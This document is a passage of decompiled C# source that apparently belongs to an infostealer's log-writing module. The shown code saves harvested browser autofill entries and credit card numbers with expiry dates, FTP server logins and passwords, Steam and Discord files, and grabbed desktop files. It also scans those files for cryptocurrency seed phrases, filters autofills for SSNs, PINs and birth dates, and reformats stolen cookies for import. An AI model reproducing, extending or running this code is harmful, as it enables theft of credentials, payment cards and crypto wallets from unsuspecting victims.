                        string path2 = directoryInfo.FullName + "\\" + BrowserProfile.Name + "_" + BrowserProfile.Profile + ".txt";
                        int num2 = 0;
                        StringBuilder stringBuilder2 = new StringBuilder();
                        stringBuilder2.AppendLine(HeaderPrms.Header);
                        stringBuilder2.Append(Environment.NewLine);
                        foreach (Autofill autofill in BrowserProfile.Autofills)
                        {
                            stringBuilder2.Append("Name: ").Append(autofill.Name).Append(Environment.NewLine)
                                .Append("Value: ")
                                .Append(autofill.Value)
                                .Append(Environment.NewLine)
                                .Append((num2 < BrowserProfile.Autofills.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
                            num2++;
                        }
                        if (!File.Exists(path2))
                        {
                            lock (FillsLock)
                            {
                                File.WriteAllText(path2, stringBuilder2.ToString());
                            }
                        }
                        stringBuilder2.Clear();
                    }
                    IList<CreditCard> creditCards = BrowserProfile.CreditCards;
                    if (creditCards == null || creditCards.Count <= 0)
                    {
                        continue;
                    }
                    DirectoryInfo directoryInfo2 = currentLogDirectory.CreateSubdirectory("CreditCards");
                    string path3 = directoryInfo2.FullName + "\\" + BrowserProfile.Name + "_" + BrowserProfile.Profile + ".txt";
                    int num3 = 0;
                    StringBuilder stringBuilder3 = new StringBuilder();
                    stringBuilder3.AppendLine(HeaderPrms.Header);
                    stringBuilder3.Append(Environment.NewLine);
                    foreach (CreditCard creditCard in BrowserProfile.CreditCards)
                    {
                        stringBuilder3.Append("Holder: ").Append(creditCard.Holder).Append(Environment.NewLine)
                            .Append("CardType: ")
                            .Append((string)smethod_1(creditCard.Holder))
                            .Append(Environment.NewLine)
                            .Append("Card: ")
                            .Append(creditCard.CardNumber)
                            .Append(Environment.NewLine)
                            .Append("Expire: ")
                            .Append(creditCard.ExpirationMonth)
                            .Append("/")
                            .Append(creditCard.ExpirationYear)
                            .Append(Environment.NewLine)
                            .Append((num3 < BrowserProfile.CreditCards.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
                        num3++;
                    }
                    if (!File.Exists(path3))
                    {
                        lock (CredLock)
                        {
                            File.WriteAllText(path3, stringBuilder3.ToString());
                        }
                    }
                    stringBuilder3.Clear();
                }
                catch (Exception)
                {
                }
            }
            if (flag && !File.Exists(path))
            {
                lock (PassLock)
                {
                    File.WriteAllText(path, stringBuilder.ToString());
                }
            }
            stringBuilder.Clear();
        }
        catch
        {
        }
    }

    public static void SaveTo(this IList<LoginPair> FtpConnections, DirectoryInfo currentLogDirectory)
    {
        try
        {
            if (FtpConnections.Count <= 0)
            {
                return;
            }
            DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(currentLogDirectory.FullName, "FTP"));
            if (!directoryInfo.Exists)
            {
                directoryInfo.Create();
            }
            string path = Path.Combine(directoryInfo.FullName, "Credentials.txt");
            int num = 0;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine(HeaderPrms.Header);
            stringBuilder.Append(Environment.NewLine);
            foreach (LoginPair FtpConnection in FtpConnections)
            {
                stringBuilder.Append("Server: ").Append(FtpConnection.Host).Append(Environment.NewLine)
                    .Append("Username: ")
                    .Append(FtpConnection.Login)
                    .Append(Environment.NewLine)
                    .Append("Password: ")
                    .Append(FtpConnection.Password)
                    .Append(Environment.NewLine)
                    .Append((num < FtpConnections.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
                num++;
            }
            if (!File.Exists(path))
            {
                lock (FtpLock)
                {
                    File.WriteAllText(path, stringBuilder.ToString());
                }
            }
            stringBuilder.Clear();
        }
        catch
        {
        }
    }

    public static void SaveSteamTo(this IList<RemoteFile> SteamFiles, DirectoryInfo currentLogDirectory)
    {
        try
        {
            foreach (RemoteFile SteamFile in SteamFiles)
            {
                if (SteamFile.FileName.IsNotNull() && SteamFile.Body.IsNull(new byte[0]).Length != 0)
                {
                    DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(currentLogDirectory.FullName, "Steam"));
                    if (!directoryInfo.Exists)
                    {
                        directoryInfo.Create();
                    }
                    string path = Path.Combine(directoryInfo.FullName, SteamFile.FileName);
                    lock (DesktopLock)
                    {
                        File.WriteAllBytes(path, SteamFile.Body);
                    }
                }
            }
        }
        catch
        {
        }
    }

    public static void SaveDiscordTo(this IList<RemoteFile> DiscordFiles, DirectoryInfo currentLogDirectory)
    {
        try
        {
            foreach (RemoteFile DiscordFile in DiscordFiles)
            {
                if (DiscordFile.FileName.IsNotNull() && DiscordFile.Body.IsNull(new byte[0]).Length != 0)
                {
                    DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(currentLogDirectory.FullName, "Discord"));
                    if (!directoryInfo.Exists)
                    {
                        directoryInfo.Create();
                    }
                    string path = Path.Combine(directoryInfo.FullName, DiscordFile.FileName);
                    lock (DesktopLock)
                    {
                        File.WriteAllBytes(path, DiscordFile.Body);
                    }
                }
            }
        }
        catch
        {
        }
    }

    public static void SaveTo(this IList<RemoteFile> DesktopFiles, DirectoryInfo currentLogDirectory)
    {
        try
        {
            foreach (RemoteFile DesktopFile in DesktopFiles)
            {
                string empty = string.Empty;
                string empty2 = string.Empty;
                try
                {
                    if (!DesktopFile.FileName.IsNotNull() || DesktopFile.Body.IsNull(new byte[0]).Length == 0)
                    {
                        continue;
                    }
                    DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(currentLogDirectory.FullName, "FileGrabber"));
                    if (!directoryInfo.Exists)
                    {
                        directoryInfo.Create();
                    }
                    string[] array = new FileInfo(DesktopFile.SourcePath).Directory.FullName.Split(new string[1]
                    {
                        new string(new char[2] { ':', '\\' })
                    }, StringSplitOptions.RemoveEmptyEntries);
                    empty = Path.Combine(directoryInfo.FullName, DesktopFile.FileDirectory ?? ((array == null || array.Length <= 1) ? string.Empty : array[1]));
                    if (!Directory.Exists(empty))
                    {
                        Directory.CreateDirectory(empty);
                    }
                    if (!Directory.Exists(empty))
                    {
                        continue;
                    }
                    lock (DesktopLock)
                    {
                        empty2 = empty + "\\" + DesktopFile.FileName;
                        try
                        {
                            List<string> mnemonics = GetMnemonics(Encoding.UTF8.GetString(DesktopFile.Body));
                            if (mnemonics.Count > 0)
                            {
                                string path = Path.Combine(currentLogDirectory.FullName, "Mnemonics.txt");
                                StringBuilder stringBuilder = new StringBuilder();
                                if (!File.Exists(path))
                                {
                                    stringBuilder.AppendLine(HeaderPrms.Header);
                                    stringBuilder.Append(Environment.NewLine);
                                }
                                foreach (string item in mnemonics)
                                {
                                    stringBuilder.Append("File: " + empty2);
                                    stringBuilder.Append(Environment.NewLine);
                                    stringBuilder.Append(item);
                                    stringBuilder.Append(Environment.NewLine);
                                    stringBuilder.Append(Environment.NewLine);
                                }
                                File.AppendAllText(path, stringBuilder.ToString());
                            }
                        }
                        catch
                        {
                        }
                        File.WriteAllBytes(empty2, DesktopFile.Body);
                    }
                }
                catch (Exception)
                {
                }
            }
        }
        catch (Exception)
        {
        }
    }

    public static List<string> GetMnemonics(string fileBody)
    {
        List<string> list = new List<string>();
        try
        {
            MatchCollection matchCollection = new Regex("(\\b[a-z]{3,10}\\b)").Matches(fileBody);
            List<string> list2 = new List<string>();
            foreach (Match item in matchCollection)
            {
                try
                {
                    string text = item.Value.Trim();
                    if (!string.IsNullOrWhiteSpace(text) && MnemWorldList.Contains(text) && !list2.Contains(text))
                    {
                        list2.Add(text);
                    }
                }
                catch
                {
                }
            }
            if (list2.Count < 12)
            {
                return list;
            }
            if (list2.Count != 12 && list2.Count != 15 && list2.Count != 18 && list2.Count != 21)
            {
                if (list2.Count != 24)
                {
                    list.Add("Possible words: " + string.Join(" ", list2));
                }
                else
                {
                    list.Add("Possible words (may be two 12-words phrases): " + string.Join(" ", list2));
                }
            }
            else
            {
                list.Add(string.Join(" ", list2));
            }
        }
        catch
        {
        }
        return list;
    }

    public static string CookiesToJSON(this IEnumerable<Meta.SharedModels.Cookie> cookies)
    {
        return JsonConvert.SerializeObject(cookies).Replace("\"Field1\"", "\"domain\"").Replace("\"Field5\"", "\"expirationDate\"")
            .Replace("\"Field2\"", "\"httpOnly\"")
            .Replace("\"Field6\"", "\"name\"")
            .Replace("\"Field3\"", "\"path\"")
            .Replace("\"Field4\"", "\"secure\"")
            .Replace("\"Field7\"", "\"value\"");
    }

    private static object smethod_0(object autofills)
    {
        List<Autofill> list = new List<Autofill>();
        try
        {
            if (autofills == null)
            {
                return list;
            }
            if (((IEnumerable<Autofill>)autofills).Count() == 0)
            {
                return list;
            }
            string[] array = new string[13]
            {
                "last_name", "first_name", "phone_number", "address", "dob", "email", "firstName", "lastName", "ssn", "pin",
                "security", "expireDate", "expirationDate"
            };
            foreach (Autofill item in (IEnumerable<Autofill>)autofills)
            {
                try
                {
                    string[] array2 = array;
                    foreach (string value in array2)
                    {
                        if (item.Name.Contains(value))
                        {
                            list.Add(item);
                            break;
                        }
                    }
                }
                catch
                {
                }
            }
        }
        catch
        {
        }
        return list.DistinctBy((Autofill x) => x.Name).IsNull(new List<Autofill>()).ToList();
    }

    private static object smethod_1(object number)
    {
        string number = (string)number;
        return (from x in (IEnumerable<KeyValuePair<string, string>>)e
                where new Regex(x.Value).Match(number.Replace(" ", "")).Success
                select x.Key).FirstOrDefault() ?? "Unknown";
    }
}
